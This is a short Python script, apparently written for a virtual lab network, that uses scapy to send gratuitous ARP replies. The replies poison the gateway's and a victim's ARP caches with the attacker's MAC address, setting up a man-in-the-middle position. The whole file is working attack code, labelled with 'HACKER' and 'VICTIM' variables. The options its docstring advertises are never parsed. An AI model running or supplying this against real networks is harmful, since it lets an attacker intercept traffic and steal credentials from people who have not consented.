#!/usr/bin/python
#

"""
  ARP poisoning using gratuious ARP requests

- send gratuitous ARP to victim and gateway, 
- with the hacker machine's MAC

 -g gateway IP address
 -v victim IP address
 -m MAC address to poison

"""

import sys
import getopt
from scapy.all import *

GATEWAY_IPADDR = '192.168.56.1'
VICTIM_IPADDR  = '192.168.56.101'
HACKER_MACADDR = '08:00:27:0c:c1:12'

arp_pkts = Ether(dst='00:00:00:00:00:00')/\
           ARP(op = 2, psrc = [GATEWAY_IPADDR, VICTIM_IPADDR], \
               pdst = '0.0.0.0', hwsrc = HACKER_MACADDR)

sendp(arp_pkts, iface='p7p1')

